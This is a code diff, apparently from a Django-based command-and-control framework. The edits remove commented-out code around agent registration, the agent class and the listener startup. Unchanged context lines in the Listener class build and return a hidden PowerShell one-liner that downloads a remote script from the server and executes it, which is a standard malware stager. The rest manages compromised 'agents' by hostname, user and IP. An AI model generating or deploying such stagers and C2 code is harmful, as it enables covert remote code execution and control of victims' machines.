@@ -49,12 +49,6 @@ def registerAgent(request):
             data = Agent.objects.filter(hname = hostname).filter(username = username).values()[0]
             agentname = data['name']
             oldusername = data['username']
-            # if oldusername == username:
-            #     pass
-            # else:
-            #     agentname     = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
-            #     s=Agent(name=agentname, ip = remoteip, hname= hostname, username= username )
-            #     s.save() 
             if data['ip'] != remoteip:
                 s=Agent.objects.filter(hname = hostname).get(username=username)
                 s.ip = remoteip
@@ -64,17 +58,6 @@ def registerAgent(request):
             s=Agent(name=agentname, ip = remoteip, hname= hostname, username= username )
             s.save() 
 
-        # if Agent.objects.filter(username = username).exists():
-        #     pass
-        # else:
-        #     agentname     = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
-
-        # request.session['agentname'] = agentname   
-        # if Agent.objects.filter(hname = hostname).exists():
-        #     pass
-        # else:    
-        #     s=Agent(name=agentname, ip = remoteip, hname= hostname, username= username )
-            # s.save()
         Listener.agent(agentname,remoteip, eth)
         request.session['agentName'] = agentname
         response = HttpResponse(agentname)
@@ -131,7 +114,6 @@ class Listener():
                 listener.save()
             oneliner = "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/sc/{}\')\"".format(ip, str(port), eth)
             return JsonResponse({"payload" : oneliner} , status=200)
-            #return render(request,'blog/payload-Gen.html', {'payloadline':oneliner})
 
         def get(self,request):
             return render(request,'blog/payload-Gen.html')
@@ -166,15 +148,13 @@ class Listener():
         def get(self,request):
             return render(request,'blog/lin_payload-Gen.html')
 
-    class agent():   ####### need to take ETH from the GUI user
+    class agent():   
         
         def __init__(self, name, remote , eth):
 
             self.name      = name
-            # self.listener  = listener
             self.remote  = remote
             self.eth = eth
-            # self.key       = key
             self.sleept    = 3
             self.Path      = listen_path+"agents/{}/".format(self.name)
             self.tasksPath = "{}tasks".format(self.Path, self.name)
@@ -190,7 +170,6 @@ class Listener():
             
         def start(self):
             server = Process(target=Listener.agent.run(self.eth_ip,port))  
-            # get Ethernet from GUI User 
             cli = sys.modules['flask.cli']
             cli.show_server_banner = lambda *x: None
             daemon = threading.Thread(name = self.name,
